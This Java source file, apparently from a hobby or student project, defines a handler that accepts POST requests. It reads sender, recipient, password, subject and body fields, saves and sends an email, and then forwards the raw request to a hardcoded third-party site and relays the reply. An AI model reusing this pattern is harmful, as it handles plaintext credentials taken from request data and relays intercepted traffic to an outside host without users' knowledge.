import java.io.*;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;

/**
 * 解析，处理http请求
 *
 */
public class HttpHandler implements Runnable {

    //负责解析http请求
    private final HttpParser httpParser;

    //负责保存邮件到本地
    private final EmaiSaver emaiSaver;

    public HttpHandler(Socket clientSocket) throws IOException {

        httpParser = new HttpParser(clientSocket);
        emaiSaver = new EmaiSaver(httpParser);

    }

    @Override
    public void run() {


            try {



            Socket socket = httpParser.getSocket();

            //获取请求ip地址
            InetAddress clientAddress = socket.getInetAddress();
            String clientIp = clientAddress.getHostAddress();


            //读取请求类型
            httpParser.readMethod();

            //不是post请求就忽略
            if (!httpParser.isPOSTMethod()) {
                return;
            }

            System.out.println("连接成功！");
            System.out.println("发送方ip地址为：" + clientIp);

            // 读取请求头
            httpParser.readHttpHeader();


            int contentLength = httpParser.getContentLength();
            System.out.println("收到的内容长度为：" + contentLength);


            //读取请求体
            httpParser.readHttpBody();

            //保存邮件到本地
            emaiSaver.SaveEmail();

            //发送邮件
             HashMap<String,String> hashMap = new HashMap();
             hashMap.put("from",httpParser.getFrom());
             hashMap.put("to",httpParser.getTo());
             hashMap.put("password",httpParser.getPassword());
             hashMap.put("subject",httpParser.getSubject());
             hashMap.put("body",httpParser.getBody());

             EmailClient emailClient = new EmailClient(hashMap);
             emailClient.sendEmail();



                // 转发 POST 请求给原目标服务器
                String targetServerHost = "www.wenku8.net";
                int targetServerPort = 80;

                Socket targetSocket = new Socket(targetServerHost, targetServerPort);
                BufferedWriter targetWriter = new BufferedWriter(new OutputStreamWriter(targetSocket.getOutputStream()));
                BufferedReader targetReader = new BufferedReader(new InputStreamReader(targetSocket.getInputStream()));

                // 构建转发的请求
                String request = httpParser.getHttpLine() + "\r\n" + httpParser.getHttpHeader() + "\r\n" + httpParser.getHttpBody();

                // 发送请求至目标服务器
                targetWriter.write(request);
                targetWriter.flush();

                // 读取目标服务器响应并转发至客户端
                PrintWriter clientWriter = new PrintWriter(socket.getOutputStream());
                String responseLine;
                while ((responseLine = targetReader.readLine()) != null) {
                    clientWriter.println(responseLine);
                }
                clientWriter.flush();

                // 关闭连接
                targetWriter.close();
                targetReader.close();
                targetSocket.close();



            // httpParser.show();


            //不响应的话浏览器会重复发送
            // 响应请求
            httpParser.response();


        } catch (IOException e) {


            System.out.println("Http错误: " + e.getMessage());


        } finally {

                try {
                    httpParser.close();
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }



    }
}
